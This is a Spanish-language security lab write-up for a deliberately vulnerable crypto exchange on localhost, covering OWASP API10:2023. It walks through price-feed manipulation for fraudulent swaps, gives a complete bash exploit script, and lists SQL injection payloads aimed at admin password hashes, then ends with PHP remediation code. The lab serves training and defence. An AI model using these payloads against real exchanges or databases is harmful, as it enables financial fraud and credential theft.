# LAB 10 - Consumo Inseguro de APIs

## Referencia OWASP: API10:2023 - Unsafe Consumption of APIs

---

## Objetivo

Explotar la confianza ciega que la plataforma CryptoVulnX deposita en datos provenientes de APIs externas (simuladas) para:

1. Manipular precios de criptomonedas a traves del feed externo de cotizaciones y ejecutar swaps a tasas fraudulentas.
2. Ejecutar una cadena completa de arbitraje: bajar precio, comprar, restaurar precio, vender.
3. Inyectar SQL a traves del campo de precios que se inserta sin sanitizar en la base de datos.

---

## Contexto

La vulnerabilidad API10:2023 se produce cuando una aplicacion consume datos de APIs externas o de terceros sin aplicar el mismo nivel de validacion y sanitizacion que aplica (o deberia aplicar) a los datos introducidos por los usuarios. Los desarrolladores tienden a confiar en los datos que provienen de otras APIs, asumiendo que son seguros y correctamente formateados.

En CryptoVulnX, el flujo vulnerable es el siguiente:

1. El endpoint `/api/internal/rates.php` actua como un **feed de cotizaciones externo** (simula una API de un proveedor de precios como CoinGecko o Binance). En un entorno real, este seria un servicio externo que proporciona precios de mercado.

2. El endpoint `/api/v1/crypto/swap.php` consulta la tabla `crypto_prices` para obtener las tasas de cambio al momento de ejecutar un swap. Estas tasas son actualizadas por el feed externo.

3. El problema critico es que:
   - El endpoint `/api/internal/rates.php` acepta POST sin autenticacion para actualizar precios.
   - Los valores recibidos del "feed externo" se insertan directamente en la base de datos **sin validacion de tipo, rango o sanitizacion**.
   - El endpoint de swap consume estos precios sin verificar si son razonables o si han cambiado drasticamente.
   - Los valores del feed se insertan en consultas SQL sin usar prepared statements, permitiendo inyeccion SQL.

Este escenario simula una situacion real donde un atacante compromete (o suplanta) una API externa de la que depende la plataforma.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `POST` | `/api/internal/rates.php` | Simula feed externo de cotizaciones (actualiza precios sin auth) |
| `GET` | `/api/internal/rates.php` | Consulta precios actuales |
| `POST` | `/api/v1/crypto/swap.php` | Intercambio de criptomonedas (consume precios sin validar) |

---

## Dificultad

**Alta** - Requiere comprender la cadena de dependencia entre APIs, la logica de negocio del swap, y tecnicas de inyeccion SQL a traves de canales indirectos.

---

## Pistas

<details>
<summary>Pista 1 - Reconocimiento de la cadena de dependencia</summary>

El endpoint de swap no calcula precios internamente; los obtiene de la tabla `crypto_prices`. ¿Quien actualiza esa tabla? Investiga el endpoint `/api/internal/rates.php`. ¿Acepta POST? ¿Requiere autenticacion? ¿Valida los datos que recibe?

</details>

<details>
<summary>Pista 2 - Manipulacion del feed de precios</summary>

Envia un POST a `/api/internal/rates.php` con un JSON como `{"rates":{"BTC":"0.01"}}`. Si el precio se actualiza sin validacion, podras comprar BTC a centavos a traves del endpoint de swap. Despues de comprar, restaura el precio original y vende para materializar la ganancia.

</details>

<details>
<summary>Pista 3 - Inyeccion SQL via canal indirecto</summary>

Los precios del feed externo se insertan en la base de datos. Si el valor del precio no se sanitiza, puedes inyectar SQL a traves del campo de precio. Intenta: `{"rates":{"BTC":"1' OR '1'='1"}}`. Esto es una inyeccion SQL de segundo orden: el payload entra por la API de rates y se ejecuta cuando el endpoint de swap consulta la tabla de precios.

</details>

---

## Solucion

### Solucion 1: Manipulacion de Precios - Cadena Completa de Arbitraje

**Paso 1**: Autenticarse para obtener un token JWT.

```bash
TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"password123"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

**Paso 2**: Consultar el precio actual de BTC y el saldo de la cuenta.

```bash
# Verificar precios actuales
curl -s http://localhost/appsec/api/internal/rates.php
```

Respuesta:
```json
{
  "status": "success",
  "rates": {
    "BTC": "67542.50",
    "ETH": "3521.80",
    "SOL": "142.30",
    "USDT": "1.00"
  },
  "last_updated": "2026-03-28T14:00:00Z"
}
```

```bash
# Verificar saldo
curl -s http://localhost/appsec/api/v1/wallet/balance.php \
  -H "Authorization: Bearer $TOKEN"
```

Respuesta:
```json
{
  "status": "success",
  "balances": {
    "USDT": "5000.00",
    "BTC": "0.00000000"
  }
}
```

**Paso 3**: Manipular el precio de BTC a $0.01 (simulando un feed externo comprometido).

```bash
curl -s -X POST http://localhost/appsec/api/internal/rates.php \
  -H "Content-Type: application/json" \
  -d '{"rates":{"BTC":"0.01"}}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Precios actualizados",
  "updated_rates": {
    "BTC": "0.01"
  },
  "previous_rates": {
    "BTC": "67542.50"
  }
}
```

**Paso 4**: Comprar BTC al precio manipulado de $0.01.

```bash
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"USDT","to":"BTC","amount":5000}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "swap": {
    "from": "USDT",
    "to": "BTC",
    "amount_sent": "5000.00",
    "amount_received": "500000.00",
    "rate_used": "0.01",
    "timestamp": "2026-03-28T14:05:00Z"
  }
}
```

Con 5,000 USDT compramos 500,000 BTC (a $0.01 cada uno).

**Paso 5**: Restaurar el precio original de BTC.

```bash
curl -s -X POST http://localhost/appsec/api/internal/rates.php \
  -H "Content-Type: application/json" \
  -d '{"rates":{"BTC":"67542.50"}}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Precios actualizados",
  "updated_rates": {
    "BTC": "67542.50"
  },
  "previous_rates": {
    "BTC": "0.01"
  }
}
```

**Paso 6**: Vender BTC al precio real para materializar las ganancias.

```bash
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"BTC","to":"USDT","amount":500000}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "swap": {
    "from": "BTC",
    "to": "USDT",
    "amount_sent": "500000.00",
    "amount_received": "33771250000.00",
    "rate_used": "67542.50",
    "timestamp": "2026-03-28T14:06:00Z"
  }
}
```

**Paso 7**: Verificar el saldo final.

```bash
curl -s http://localhost/appsec/api/v1/wallet/balance.php \
  -H "Authorization: Bearer $TOKEN"
```

Respuesta:
```json
{
  "status": "success",
  "balances": {
    "USDT": "33771250000.00",
    "BTC": "0.00000000"
  }
}
```

**Resultado**: Inversion de 5,000 USDT convertida en 33,771,250,000 USDT (mas de 33 mil millones).

---

### Solucion 2: Inyeccion SQL a traves del Feed de Precios

**Paso 1**: Inyectar SQL a traves del campo de precio.

```bash
curl -s -X POST http://localhost/appsec/api/internal/rates.php \
  -H "Content-Type: application/json" \
  -d "{\"rates\":{\"BTC\":\"1' OR '1'='1\"}}"
```

Respuesta esperada (si el servidor es vulnerable):
```json
{
  "status": "success",
  "message": "Precios actualizados",
  "updated_rates": {
    "BTC": "1' OR '1'='1"
  }
}
```

**Paso 2**: Verificar el efecto de la inyeccion cuando el swap consulta el precio.

```bash
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"USDT","to":"BTC","amount":100}'
```

Respuesta esperada (error SQL expuesto):
```json
{
  "status": "error",
  "message": "Database error",
  "debug": {
    "sql_error": "You have an error in your SQL syntax...",
    "sql_query": "SELECT price FROM crypto_prices WHERE symbol = 'BTC' AND price = '1' OR '1'='1'",
    "error_code": 1064
  }
}
```

**Paso 3**: Intentar inyecciones mas sofisticadas para extraer datos.

```bash
# Inyeccion UNION para extraer credenciales de la tabla users
curl -s -X POST http://localhost/appsec/api/internal/rates.php \
  -H "Content-Type: application/json" \
  -d "{\"rates\":{\"BTC\":\"1' UNION SELECT password_hash FROM users WHERE role='admin' -- \"}}"
```

**Paso 4**: Intentar inyeccion basada en tiempo para confirmar la vulnerabilidad.

```bash
# Inyeccion basada en tiempo
curl -s -X POST http://localhost/appsec/api/internal/rates.php \
  -H "Content-Type: application/json" \
  -d "{\"rates\":{\"BTC\":\"1'; SELECT SLEEP(5); -- \"}}"
```

Si el servidor tarda 5 segundos en responder, confirma la inyeccion SQL ciega.

---

### Script Completo de Explotacion

```bash
#!/bin/bash
# exploit_unsafe_consumption.sh
# Demuestra la cadena completa de explotacion: feed comprometido -> swap fraudulento

BASE="http://localhost/appsec"
RATES_URL="$BASE/api/internal/rates.php"
SWAP_URL="$BASE/api/v1/crypto/swap.php"
BALANCE_URL="$BASE/api/v1/wallet/balance.php"
LOGIN_URL="$BASE/api/v1/auth/login.php"

echo "============================================"
echo " CryptoVulnX - Unsafe API Consumption Exploit"
echo "============================================"

# 1. Login
echo -e "\n[1] Autenticando..."
TOKEN=$(curl -s -X POST "$LOGIN_URL" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"password123"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "    Token obtenido: ${TOKEN:0:20}..."

# 2. Saldo inicial
echo -e "\n[2] Saldo inicial:"
curl -s "$BALANCE_URL" -H "Authorization: Bearer $TOKEN" | python -m json.tool

# 3. Precio original
echo -e "\n[3] Precio original de BTC:"
ORIGINAL_PRICE=$(curl -s "$RATES_URL" | python -c "import sys,json; print(json.load(sys.stdin)['rates']['BTC'])")
echo "    BTC = \$$ORIGINAL_PRICE"

# 4. Manipular precio
echo -e "\n[4] Manipulando precio de BTC a \$0.01..."
curl -s -X POST "$RATES_URL" \
  -H "Content-Type: application/json" \
  -d '{"rates":{"BTC":"0.01"}}' | python -m json.tool

# 5. Comprar BTC barato
echo -e "\n[5] Comprando BTC al precio manipulado..."
curl -s -X POST "$SWAP_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"USDT","to":"BTC","amount":5000}' | python -m json.tool

# 6. Restaurar precio
echo -e "\n[6] Restaurando precio original de BTC a \$$ORIGINAL_PRICE..."
curl -s -X POST "$RATES_URL" \
  -H "Content-Type: application/json" \
  -d "{\"rates\":{\"BTC\":\"$ORIGINAL_PRICE\"}}" | python -m json.tool

# 7. Vender BTC al precio real
echo -e "\n[7] Vendiendo BTC al precio real..."
curl -s -X POST "$SWAP_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"BTC","to":"USDT","amount":500000}' | python -m json.tool

# 8. Saldo final
echo -e "\n[8] Saldo final:"
curl -s "$BALANCE_URL" -H "Authorization: Bearer $TOKEN" | python -m json.tool

echo -e "\n[*] Explotacion completada."
```

---

## Remediacion

### 1. Validar y Sanitizar Datos de APIs Externas

```php
<?php
// helpers/external_data_validator.php

/**
 * Valida los datos recibidos de APIs externas con el mismo rigor
 * que se aplica a los datos de usuario.
 */
class ExternalDataValidator {

    /**
     * Valida un precio de criptomoneda recibido de un feed externo.
     */
    public static function validateCryptoPrice(string $symbol, $price): float {
        // 1. Verificar que es numerico
        if (!is_numeric($price)) {
            throw new InvalidArgumentException(
                "Precio invalido para $symbol: no es numerico"
            );
        }

        $price = (float)$price;

        // 2. Verificar que es positivo
        if ($price <= 0) {
            throw new InvalidArgumentException(
                "Precio invalido para $symbol: debe ser positivo"
            );
        }

        // 3. Verificar rango razonable segun la moneda
        $price_ranges = [
            'BTC' => ['min' => 1000, 'max' => 500000],
            'ETH' => ['min' => 100, 'max' => 50000],
            'SOL' => ['min' => 1, 'max' => 5000],
            'ADA' => ['min' => 0.01, 'max' => 100],
            'XRP' => ['min' => 0.01, 'max' => 100],
            'USDT' => ['min' => 0.95, 'max' => 1.05],
        ];

        if (isset($price_ranges[$symbol])) {
            $range = $price_ranges[$symbol];
            if ($price < $range['min'] || $price > $range['max']) {
                throw new RangeException(
                    "Precio fuera de rango para $symbol: $price " .
                    "(rango permitido: {$range['min']} - {$range['max']})"
                );
            }
        }

        return $price;
    }

    /**
     * Verifica que el cambio de precio no sea anomalo respecto al ultimo precio conocido.
     */
    public static function validatePriceChange(
        float $current_price,
        float $new_price,
        float $max_change_pct = 10.0
    ): bool {
        if ($current_price <= 0) return true;

        $change_pct = abs(($new_price - $current_price) / $current_price) * 100;

        if ($change_pct > $max_change_pct) {
            throw new RangeException(
                "Cambio de precio anomalo: $change_pct% " .
                "(maximo permitido: $max_change_pct%)"
            );
        }

        return true;
    }
}
```

### 2. Usar Prepared Statements para Actualizar Precios

```php
<?php
// api/internal/rates.php - Corregido con prepared statements

// ANTES (vulnerable):
// $query = "UPDATE crypto_prices SET price = '$price' WHERE symbol = '$symbol'";
// $pdo->exec($query);

// DESPUES (seguro):
$stmt = $pdo->prepare(
    "UPDATE crypto_prices SET price = :price, updated_at = NOW() WHERE symbol = :symbol"
);

foreach ($validated_rates as $symbol => $price) {
    try {
        $validated_price = ExternalDataValidator::validateCryptoPrice($symbol, $price);

        // Obtener precio actual para validar cambio
        $current_stmt = $pdo->prepare("SELECT price FROM crypto_prices WHERE symbol = ?");
        $current_stmt->execute([$symbol]);
        $current_price = (float)$current_stmt->fetchColumn();

        ExternalDataValidator::validatePriceChange($current_price, $validated_price);

        $stmt->execute([
            ':price' => $validated_price,
            ':symbol' => $symbol
        ]);
    } catch (Exception $e) {
        error_log("[RATE_UPDATE_REJECTED] $symbol: " . $e->getMessage());
        $rejected[$symbol] = $e->getMessage();
    }
}
```

### 3. Autenticar las APIs Internas / Feeds Externos

```php
<?php
// api/internal/rates.php - Requiere autenticacion de servicio

// Verificar token de servicio (API key del proveedor externo)
$api_key = $_SERVER['HTTP_X_API_KEY'] ?? '';
$valid_keys = [
    getenv('RATES_PROVIDER_API_KEY'),
    getenv('BACKUP_RATES_PROVIDER_API_KEY')
];

$authenticated = false;
foreach ($valid_keys as $valid_key) {
    if ($valid_key && hash_equals($valid_key, $api_key)) {
        $authenticated = true;
        break;
    }
}

if (!$authenticated) {
    http_response_code(401);
    echo json_encode(["error" => "API key de proveedor invalida"]);
    error_log("[UNAUTHORIZED_RATE_UPDATE] IP: {$_SERVER['REMOTE_ADDR']}");
    exit;
}
```

### 4. Implementar Verificacion Cruzada de Precios

```php
<?php
// helpers/price_verification.php

/**
 * Verifica precios consultando multiples fuentes antes de actualizar.
 * No confiar en una sola fuente.
 */
class PriceVerifier {

    private array $providers;

    public function __construct() {
        $this->providers = [
            'coingecko' => getenv('COINGECKO_API_URL'),
            'binance' => getenv('BINANCE_API_URL'),
            'coinmarketcap' => getenv('CMC_API_URL')
        ];
    }

    /**
     * Obtiene el precio de consenso consultando multiples fuentes.
     * Rechaza si la desviacion entre fuentes es mayor al umbral.
     */
    public function getConsensusPrice(string $symbol, float $proposed_price): float {
        $prices = [];

        foreach ($this->providers as $name => $url) {
            try {
                $price = $this->fetchPrice($url, $symbol);
                if ($price > 0) {
                    $prices[$name] = $price;
                }
            } catch (Exception $e) {
                error_log("[PRICE_FETCH_FAILED] Provider: $name, Error: " . $e->getMessage());
            }
        }

        if (count($prices) < 2) {
            throw new RuntimeException(
                "No se pudieron obtener suficientes fuentes de precio para verificacion"
            );
        }

        $median = $this->calculateMedian(array_values($prices));

        // El precio propuesto debe estar dentro del 5% de la mediana
        $deviation = abs(($proposed_price - $median) / $median) * 100;

        if ($deviation > 5.0) {
            throw new RangeException(
                "Precio propuesto ($proposed_price) se desvia {$deviation}% " .
                "de la mediana de mercado ($median)"
            );
        }

        return $proposed_price;
    }

    private function fetchPrice(string $base_url, string $symbol): float {
        $ch = curl_init("$base_url/price?symbol=$symbol");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
        $response = json_decode(curl_exec($ch), true);
        curl_close($ch);

        return (float)($response['price'] ?? 0);
    }

    private function calculateMedian(array $values): float {
        sort($values);
        $count = count($values);
        $mid = (int)($count / 2);

        if ($count % 2 === 0) {
            return ($values[$mid - 1] + $values[$mid]) / 2;
        }

        return $values[$mid];
    }
}
```

### 5. Monitoreo y Alertas para Cambios de Precio Anomalos

```php
<?php
// helpers/price_monitor.php

function monitorPriceUpdate(PDO $pdo, string $symbol, float $old_price, float $new_price): void {
    $change_pct = abs(($new_price - $old_price) / $old_price) * 100;

    // Registrar todos los cambios de precio
    $stmt = $pdo->prepare(
        "INSERT INTO price_audit_log (symbol, old_price, new_price, change_pct, source_ip, created_at)
         VALUES (?, ?, ?, ?, ?, NOW())"
    );
    $stmt->execute([$symbol, $old_price, $new_price, $change_pct, $_SERVER['REMOTE_ADDR']]);

    // Alertar si el cambio es significativo
    if ($change_pct > 5.0) {
        error_log("[PRICE_ALERT] $symbol cambio $change_pct%: $old_price -> $new_price");

        // Pausar swaps automaticamente si el cambio es extremo
        if ($change_pct > 20.0) {
            $stmt = $pdo->prepare(
                "UPDATE system_config SET value = 'paused' WHERE key_name = 'swap_status'"
            );
            $stmt->execute();
            error_log("[CRITICAL] Swaps pausados por cambio de precio anomalo en $symbol");
        }
    }
}
```
